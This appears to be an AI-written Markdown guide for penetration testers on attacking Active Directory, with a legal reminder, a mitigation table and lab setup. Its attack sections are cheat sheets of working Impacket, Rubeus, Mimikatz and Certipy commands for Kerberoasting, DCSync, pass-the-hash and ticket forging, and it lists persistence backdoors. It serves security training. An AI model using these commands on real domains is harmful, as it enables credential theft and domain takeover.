# 🧠 Ultimate Active Directory (AD) Guide for Penetration Testers

📖 Table of Contents

1. What is Active Directory?
2. Key AD Concepts You MUST Know
3. AD Attack Surface & Mindset
4. The 4 Phases of AD Pentesting
5. Essential AD Enumeration Tools
6. The Most Common AD Attacks (with Cheatsheets)
   · Kerberoasting
   · AS‑REP Roasting
   · Golden Ticket & Silver Ticket
   · DCSync
   · Pass‑the‑Hash & Overpass‑the‑Hash
   · ACL Abuse
   · Resource‑Based Constrained Delegation (RBCD)
   · AD CS (ESC) Attacks
7. AD Persistence Techniques
8. How to Defend & Mitigate (Blue Team Summary)
9. The GOAD Project – Your Free AD Lab
10. Learning Resources & Next Steps

⚠️ Legal reminder: Only perform AD attacks against systems you own or have explicit written permission to test. Unauthorized access is illegal.

---
## 1. What is Active Directory?

Active Directory (AD) is Microsoft's **directory service** – a central database that manages users, computers, printers, and permissions across a Windows network.

- **Phonebook role** – stores every account, password hash, group membership, and access rule.
- **Security guard role** – enforces authentication (Kerberos) and authorization.

**Pentester’s goal:** Gain **Domain Admin (DA)** or equivalent privileges. That means you control **every** computer, user, and resource in the domain – like getting root on an entire city.

---

## 2. Key AD Concepts (Must-Know)

| Concept | What it is | Why it matters for hacking |
|---------|-----------|----------------------------|
| **Domain Controller (DC)** | Server that runs AD | Crown jewel – compromise it = own the domain |
| **Domain** | Group of objects (users, computers, groups) | Main attack boundary |
| **Forest** | Collection of domains that trust each other | Pivot across domains |
| **Organizational Unit (OU)** | Container that organizes objects | GPOs often target OUs |
| **Security Groups** | `Domain Admins`, `Enterprise Admins`, `Server Operators`, etc. | Membership defines your power |
| **Kerberos** | Default AD authentication protocol | Most AD attacks target Kerberos |
| **SID (Security Identifier)** | Unique ID for every AD object | Used in ticket attacks & SID-History abuse |
| **GPO (Group Policy Object)** | Settings applied to OUs (password policies, scripts) | Misconfigured GPOs give privilege escalation |

---

## 3. AD Attack Mindset (4 Phases)

1. **Enumerate** – you cannot attack what you don’t see. Use BloodHound, LDAP queries.
2. **Privilege escalation / lateral movement** – move from a low-priv user to a service account, then to a local admin.
3. **Domain dominance** – reach a user that has rights on the DC (e.g., Domain Admin, Enterprise Admin).
4. **Persistence & pillaging** – dump all hashes, create backdoors (Golden Ticket), exfiltrate data.

---

## 4. Essential AD Enumeration Tools

| Tool | Purpose |
|------|---------|
| **BloodHound** | Maps AD attack paths (using SharpHound collector) |
| **PowerView** (PowerShell) | Enumerate users, groups, SPNs, ACLs, sessions |
| **ADModule** | Microsoft signed AD PowerShell module |
| **CrackMapExec** | Swarm tool – execute commands, dump hashes, check creds |
| **Impacket** (Python) | `secretsdump.py`, `GetNPUsers.py`, `GetUserSPNs.py` |
| **LDAP queries** | `ldapsearch`, `adfind` |
| **Rubeus** (C#) | Kerberos attacks (Kerberoasting, AS-REP Roasting) |
| **Mimikatz** | Extract tickets, hashes, Golden/Silver tickets |

---

## 5. Most Common AD Attacks (Step-by-Step)

### 🔥 Kerberoasting
- **Abuses:** Service accounts with SPNs (Service Principal Names) – their password hash is encrypted with a user’s key.
- **Result:** Crack hash offline → service account password → often DA.
```bash
# Linux (Impacket)
GetUserSPNs.py -request -dc-ip <DC_IP> <domain>/<user>

# Windows (Rubeus)
Rubeus.exe kerberoast /outfile:hashes.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt rockyou.txt
```

🔥 AS-REP Roasting

· Abuses: Users with "Do not require Kerberos pre-authentication" set.
· Result: Extract crackable hash without any account.

```bash
# Impacket
GetNPUsers.py -dc-ip <DC_IP> -request <domain>/ -usersfile users.txt

# Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

🎫 Golden Ticket

· Abuses: Forge a Kerberos TGT using the krbtgt hash.
· Result: Become anyone (even a fake Domain Admin) – full domain persistence.

```bash
# Mimikatz (after DC compromise)
lsadump::lsa /inject /name:krbtgt

# Then forge ticket
kerberos::golden /domain:<domain> /sid:<domain_SID> /krbtgt:<hash> /user:Administrator /id:500 /ptt
```

🎫 Silver Ticket

· Abuses: Forge a service ticket (e.g., for CIFS, HOST) using a machine account hash.
· Result: Access that specific service without contacting DC.

```bash
# Mimikatz
kerberos::golden /domain:<domain> /sid:<domain_SID> /target:<targetDC> /service:cifs /rc4:<NTLM_hash_of_machine> /user:Administrator /ptt
```

🔁 DCSync

· Abuses: Replicate directory changes – dump all password hashes like a real DC.
· Requires: Replicating Directory Changes rights (often Domain Admin).

```bash
# Mimikatz
lsadump::dcsync /domain:<domain> /user:Administrator

# Impacket
secretsdump.py -just-dc <domain>/<user>@<DC_IP>
```

🔑 Pass-the-Hash (PtH) & Overpass-the-Hash

· PtH: Use NTLM hash to authenticate without plaintext password.
· Overpass-the-Hash: Use hash to request a Kerberos TGT.

```bash
# Impacket (PtH)
psexec.py -hashes <LM:NTLM> <domain>/<user>@<target>

# Mimikatz (Overpass-the-Hash)
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:powershell
```

🔓 ACL Abuse

· Abuses: Dangerous ACEs (e.g., ForceChangePassword, GenericAll, WriteDacl).
· Tool: BloodHound shows "Edge" attacks – e.g., if you have GenericAll on a user, you can reset their password.

```bash
# Reset a user's password (with PowerView)
Set-DomainUserPassword -Identity targetUser -NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)
```

⛓️ Resource-Based Constrained Delegation (RBCD)

· Abuses: If you can write msDS-AllowedToActOnBehalfOfOtherIdentity on a machine.
· Result: Compromise that machine by impersonating any user.

```bash
# With PowerView/StandIn
StandIn.exe --rdelegate --target <machine> --attacker <controlled_account>
```

🏛️ AD CS (Certificate Services) – ESC Attacks

· Abuses: Misconfigured certificate templates (ESC1, ESC2, ESC3, ESC8).
· Result: Request a certificate that authenticates as a Domain Admin.

```bash
# Certipy
certipy find -u <user> -p <pass> -dc-ip <DC_IP>
certipy req -u <user> -p <pass> -target <CA> -template <vulnerable_template>
```

---

6. AD Persistence Techniques

Technique How it works
Golden Ticket Forge TGT with krbtgt hash – valid as long as krbtgt unchanged
Silver Ticket Forge service ticket for a specific service
Skeleton Key Inject a master password into LSASS (DC only)
AdminSDHolder Give yourself rights to all protected groups
Security Support Provider (SSP) Install a malicious SSP to log plaintext passwords
DCShadow Register a fake DC to inject objects/attributes

---

7. How to Defend (Blue Team Summary)

Attack Mitigation
Kerberoasting Use Group Managed Service Accounts (gMSA) + long complex passwords (>25 chars)
AS-REP Roasting Find & disable "Do not require Kerberos pre‑auth" – or enforce strong passwords
Golden Ticket Regularly change krbtgt password (twice) & monitor TGT lifetime anomalies
DCSync Restrict "Replicating Directory Changes" rights – only to Domain Controllers
Pass-the-Hash Enable Credential Guard, use Protected Users group
ACL abuse Auditing of dangerous ACEs – BloodHound helps find them
AD CS attacks Apply PKI hardening: remove vulnerable templates, enforce CA security

---

8. The GOAD Project – Your Free AD Lab

GOAD (Game of Active Directory) is a free, pre‑built vulnerable AD lab that runs on VirtualBox/VMware.

· Contains misconfigurations designed to teach real attacks.
· Comes with a walkthrough and attack plan.

Setup steps:

1. Install Vagrant & VirtualBox.
2. Clone GOAD: git clone https://github.com/Orange-Cyberdefense/GOAD
3. Run vagrant up inside the GOAD directory.
4. Attack machine: Kali Linux (in same network).

Alternative (lighter): Use TryHackMe rooms – "Active Directory Basics", "Attacktive Directory", "Ra".

---

9. Learning Resources & Next Steps

Resource Type
HTB Academy: Active Directory LDAP, Kerberos, Attacks Structured modules
TryHackMe: AD rooms Beginner friendly
The Cyber Mentor (YouTube) – "Practical Ethical Hacking – AD" Free video course
Book: Active Directory Security Red Team’s Guide (by Jorge Orchilles) Deep technical
BloodHound documentation Attack path mapping

Suggested learning order:

1. Understand LDAP & Kerberos basics.
2. Set up a small AD lab (1 DC + 1 workstation).
3. Practice manual enumeration (PowerView, ADModule).
4. Use BloodHound to find attack paths.
5. Execute each attack (Kerberoast → DCSync → Golden Ticket).
6. Break and rebuild your lab repeatedly.

---

10. One‑Page AD Attack Cheatsheet (Quick Reference)

```bash
# Enumeration
SharpHound.exe -c All                     # Collect data for BloodHound
Get-NetUser | select name                 # List all users
Get-NetGroup -GroupName "Domain Admins"   # Find DA members

# Kerberoasting
Rubeus.exe kerberoast /out:hash.txt
hashcat -m 13100 hash.txt rockyou.txt

# AS-REP Roasting
Rubeus.exe asreproast /format:hashcat

# DCSync (Mimikatz)
lsadump::dcsync /domain:lab.local /user:Administrator

# Pass-the-Hash (Impacket)
psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c lab.local/administrator@192.168.1.10

# Golden Ticket (Mimikatz)
kerberos::golden /domain:lab.local /sid:S-1-5-21-... /krbtgt:hash /user:Administrator /ptt
```

---

Final thought: AD testing is 90% enumeration and 10% exploitation. Know your LDAP, know BloodHound, and practice in a lab until the attacks become muscle memory. Then, and only then, test with permission in real environments.

Now go build your GOAD lab. 🎯

```

---

Just copy everything above into a file named `AD-Pentesting-Guide.md` and you're ready. Let me know if you want any section expanded or changed.